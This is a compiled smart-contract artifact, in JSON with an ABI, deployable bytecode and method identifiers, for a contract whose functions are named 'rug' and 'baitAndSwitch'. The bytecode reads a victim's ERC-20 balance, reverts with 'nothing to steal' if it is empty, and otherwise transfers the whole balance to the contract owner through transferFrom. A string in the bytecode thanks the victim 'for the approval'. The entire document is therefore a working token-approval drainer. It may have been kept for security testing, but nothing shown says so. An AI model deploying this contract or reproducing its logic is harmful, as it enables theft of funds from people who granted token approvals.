{
    "abi": [
        {
            "type": "constructor",
            "inputs": [],
            "stateMutability": "nonpayable"
        },
        {
            "type": "function",
            "name": "baitAndSwitch",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "string",
                    "internalType": "string"
                }
            ],
            "stateMutability": "pure"
        },
        {
            "type": "function",
            "name": "owner",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "address",
                    "internalType": "address"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "rug",
            "inputs": [
                {
                    "name": "token",
                    "type": "address",
                    "internalType": "address"
                },
                {
                    "name": "victim",
                    "type": "address",
                    "internalType": "address"
                }
            ],
            "outputs": [],
            "stateMutability": "nonpayable"
        }
    ],
    "bytecode": {
        "object": "0x608060405234801561000f575f80fd5b505f80546001600160a01b031916331790556103268061002e5f395ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c806359adde7f146100435780636a3b7ec2146100615780638da5cb5b14610076575b5f80fd5b61004b6100a0565b60405161005891906101f4565b60405180910390f35b61007461006f36600461025a565b6100c0565b005b5f54610088906001600160a01b031681565b6040516001600160a01b039091168152602001610058565b60606040518060600160405280602881526020016102c960289139905090565b6040516370a0823160e01b81526001600160a01b0382811660048301525f91908416906370a0823190602401602060405180830381865afa158015610107573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012b919061028b565b90505f81116101735760405162461bcd60e51b815260206004820152601060248201526f1b9bdd1a1a5b99c81d1bc81cdd19585b60821b604482015260640160405180910390fd5b5f546040516323b872dd60e01b81526001600160a01b038481166004830152918216602482015260448101839052908416906323b872dd906064016020604051808303815f875af11580156101ca573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ee91906102a2565b50505050565b5f6020808352835180828501525f5b8181101561021f57858101830151858201604001528201610203565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b0381168114610255575f80fd5b919050565b5f806040838503121561026b575f80fd5b6102748361023f565b91506102826020840161023f565b90509250929050565b5f6020828403121561029b575f80fd5b5051919050565b5f602082840312156102b2575f80fd5b815180151581146102c1575f80fd5b939250505056fe5468616e6b7320666f722074686520617070726f76616c212049276c6c206265206261636b2e2e2ea26469706673582212201bb909484622784b71f4970ab469764eb95933bc334592153b997f0b24c5272164736f6c63430008140033",
        "linkReferences": {}
    },
    "methodIdentifiers": {
        "baitAndSwitch()": "59adde7f",
        "owner()": "8da5cb5b",
        "rug(address,address)": "6a3b7ec2"
    },
    "id": 2
}